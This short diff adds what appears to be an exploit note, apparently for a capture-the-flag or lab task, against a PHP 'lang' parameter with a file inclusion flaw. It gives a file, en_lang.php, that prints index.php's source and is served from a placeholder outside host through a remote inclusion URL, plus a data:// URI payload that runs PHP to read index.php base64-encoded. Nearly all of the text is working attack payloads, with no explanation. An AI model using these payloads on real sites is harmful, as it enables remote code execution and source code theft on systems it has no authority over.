@@ -1,0 +1,9 @@
+en_lang.php
+<?php show_source('index.php'); ?>
+
+?lang=http://_SOME_SITE_/en
+
+or
+
+?lang=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+
